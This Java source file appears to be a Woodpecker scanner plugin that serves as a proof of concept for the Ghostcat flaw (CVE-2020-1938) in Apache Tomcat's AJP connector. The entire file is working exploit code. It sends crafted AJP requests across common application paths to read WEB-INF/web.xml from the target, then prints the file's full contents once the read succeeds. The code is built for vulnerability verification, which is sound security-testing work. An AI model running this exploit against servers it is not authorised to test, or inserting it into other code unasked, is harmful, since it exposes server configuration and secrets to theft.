package me.gv7.woodpecker.vuldb.CVE_2020_1938.poc;

import com.github.jrialland.ajpclient.*;
import me.gv7.woodpecker.plugin.IPoc;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.plugin.IScanResult;
import me.gv7.woodpecker.plugin.ITarget;
import me.gv7.woodpecker.vuldb.CVE_2020_1938.CVE_2020_1938_Plugin;
import me.gv7.woodpecker.vuldb.CVE_2020_1938.utils.AJPClient;

public class CVE_2020_1938_Poc implements IPoc {
    String[] apps = new String[]{"/","/docs/","/examples/","/host-manager/","/manager/"};
    String[] paths = new String[]{"favicon.ico","index.jsp","index.jspx","login.jsp","login.jspx"};

    public IScanResult doVerify(ITarget target, IResultOutput iResultOutput) {
        IScanResult scanResult = CVE_2020_1938_Plugin.pluginHelper.createScanResult();
        String host = target.getHost();
        int port = target.getPort();

        for(String app:apps){
            for(String path:paths){
                // requestUri 确定着中间件会以什么格式解析目标文件，同时也会存在
                String requestUri = String.format("%s/%s",app,path);
                if(requestUri.startsWith("//")){
                    requestUri = requestUri.substring(1,requestUri.length());
                }
                AJPClient ajpClient = new AJPClient(host,port,requestUri);
                ajpClient.setRequest_uri("/");
                ajpClient.setServlet_path("/");
                ajpClient.setPath_info("WEB-INF/web.xml");
                try {
                    SimpleForwardResponse response = ajpClient.send();
                    if (response.getResponseBodyAsString().indexOf("<?xml") >= 0) {
                        iResultOutput.successPrintln(String.format("%s ---> %d", requestUri, response.getStatusCode()));
                        iResultOutput.rawPrintln("/WEB-INF/web.xml content:\n");
                        iResultOutput.rawPrintln(response.getResponseBodyAsString());
                        scanResult.setExists(true);
                        scanResult.setMsg(response.getResponseBodyAsString());
                        return scanResult;
                    }else{
                        iResultOutput.failPrintln(String.format("%s ---> %d", requestUri, response.getStatusCode()));
                    }
                }catch (Exception e){
                    iResultOutput.errorPrintln(CVE_2020_1938_Plugin.pluginHelper.getThrowableInfo(e));
                }
            }
        }
        return scanResult;
    }
}
